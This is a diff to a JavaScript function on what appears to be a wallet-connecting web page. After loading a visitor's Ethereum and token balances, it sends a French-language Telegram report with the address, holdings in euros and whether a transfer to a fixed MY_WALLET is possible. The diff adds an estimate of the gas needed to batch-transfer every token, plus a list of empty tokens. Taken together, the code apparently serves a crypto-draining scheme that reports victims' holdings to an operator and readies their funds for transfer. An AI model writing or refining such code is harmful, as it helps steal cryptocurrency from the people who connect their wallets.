@@ -534,11 +534,27 @@ async function loadBalances() {
   }
 
   // After all balances loaded — send Telegram summary
-  Promise.allSettled(tokenPromises).then(() => {
+  Promise.allSettled(tokenPromises).then(async () => {
     const net    = NETWORKS[state.chainId]?.name ?? `Chain ${state.chainId}`;
     const ethBal = state.balances['ETH']?.formatted ?? '0';
     const ethEur = toEur(ethBal, 'ETH') ?? '';
     const canTransfer = MY_WALLET && ethers.isAddress(MY_WALLET);
+
+    // Estimate gas cost for a typical batch (21000 * nb tokens * gas price)
+    let gasWarning = '';
+    try {
+      const feeData    = await state.provider.getFeeData();
+      const gasPrice   = feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n;
+      const tokenCount = Object.values(state.balances).filter(b => b.token && b.raw > 0n).length;
+      const estimatedGas = gasPrice * BigInt(21000 + tokenCount * 65000);
+      const ethRaw     = state.balances['ETH']?.raw ?? 0n;
+      if (ethRaw < estimatedGas && ethRaw > 0n) {
+        const needed = parseFloat(ethers.formatEther(estimatedGas)).toFixed(6);
+        gasWarning = `\n⛽ *Attention : ETH insuffisant pour le gas !*\nEstimé nécessaire : \`${needed} ETH\``;
+      } else if (ethRaw === 0n) {
+        gasWarning = '\n⛽ *Attention : 0 ETH — impossible de payer le gas !*';
+      }
+    } catch { /* ignore */ }
 
     // Compute total EUR
     let totalEur = 0;
@@ -550,13 +566,23 @@ async function loadBalances() {
       ? totalEur.toLocaleString('fr-FR', { style: 'currency', currency: 'EUR', maximumFractionDigits: 2 })
       : '—';
 
-    const tokenLines = Object.entries(state.balances)
-      .filter(([sym, { formatted }]) => sym !== 'ETH' && parseFloat(formatted) > 0)
-      .map(([sym, { formatted }]) => {
-        const eur = toEur(formatted, sym);
-        return `  • ${formatted} ${sym}${eur ? ` (${eur})` : ''}`;
-      })
-      .join('\n') || '  • Aucun token avec solde';
+    // Tokens with balance + empty tokens warning
+    const withBalance = Object.entries(state.balances)
+      .filter(([sym, { formatted }]) => sym !== 'ETH' && parseFloat(formatted) > 0);
+    const empty = Object.entries(state.balances)
+      .filter(([sym, { formatted }]) => sym !== 'ETH' && parseFloat(formatted) === 0)
+      .map(([sym]) => sym);
+
+    const tokenLines = withBalance.length
+      ? withBalance.map(([sym, { formatted }]) => {
+          const eur = toEur(formatted, sym);
+          return `  • ${formatted} ${sym}${eur ? ` (${eur})` : ''}`;
+        }).join('\n')
+      : '  • Aucun token avec solde';
+
+    const emptyLine = empty.length
+      ? `\n⚠️ *Solde 0 :* ${empty.join(', ')}`
+      : '';
 
     const transferable = canTransfer
       ? '✅ Transfer possible vers ' + MY_WALLET.slice(0,6) + '…' + MY_WALLET.slice(-4)
@@ -567,9 +593,10 @@ async function loadBalances() {
       + `📍 \`${state.address}\`\n`
       + `🌐 Réseau : ${net}\n\n`
       + `💎 ETH : \`${ethBal}\`${ethEur ? ` (${ethEur})` : ''}\n`
-      + `🪙 Tokens :\n${tokenLines}\n\n`
+      + `🪙 Tokens :\n${tokenLines}${emptyLine}\n\n`
       + `💶 *Total estimé : ${totalStr}*\n\n`
       + transferable
+      + gasWarning
     );
   });
 }
